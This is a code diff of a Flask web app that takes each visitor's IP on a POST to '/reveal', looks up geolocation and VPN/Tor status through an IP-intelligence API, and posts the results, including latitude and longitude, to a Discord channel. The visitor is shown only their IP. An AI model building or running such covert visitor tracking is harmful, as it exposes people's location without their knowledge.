@@ -61,36 +61,36 @@ def send_ip_to_discord(ip, data):
                         value=f"Latitude: {data['location']['latitude']}\n"
                               f"Longitude: {data['location']['longitude']}",
                         inline=False)
-        # Use the bot's API to send the message
+        embed.set_thumbnail(url=data['flag']['png'])
+        
         asyncio.run_coroutine_threadsafe(
-            # Format the message with the IP and location data
+            # This is the coroutine that sends the embed message to the Discord channel
             channel.send(embed=embed),
-            #channel.send(f"New visitor IP: `{ip}`\n{data["location"]["city"]}, {data["location"]["region"]}\nCountry: {data["location"]["country"]} {data["flag"]["emoji"]}\nIs VPN: {data["security"]["is_vpn"]}\nIs Proxy: {data["security"]["is_proxy"]}\nIs Tor: {data["security"]["is_tor"]}\nIs Mobile: {data["security"]["is_mobile"]}\nLatitude: {data["location"]["latitude"]}\nLongitude: {data["location"]["longitude"]}"),
             bot.loop
         )
     else:
         print("Channel not found. Is the bot connected?")
 
 @app.route("/", methods=["GET"])
-#def get_ip():
 def render_page():
-    #forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
-    #ip = forwarded.split(',')[0].strip()
-    # Make a request to the Abstract API to get IP intelligence data
-    #response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
-    #data = json.loads(response.text)
-    #send_ip_to_discord(ip, data)
-    #return response.json()  # Return the JSON response directly
     return render_template("index.html")
 
+#This will only be able to be accessed with a POST request from the webpage, hopefully preventing spam from bots
 @app.route("/reveal", methods=["POST"])
 def reveal_ip():
+
     forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = forwarded.split(',')[0].strip()
+
+    # Make a request to the Abstract API to get IP intelligence data and parse the response
     response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
     data = json.loads(response.text)
+
     send_ip_to_discord(ip, data)
+
+    #return response.json()  # Return the JSON response directly from the Abstract API
     return jsonify({"ip": ip})
+
 
 
 def run_flask():
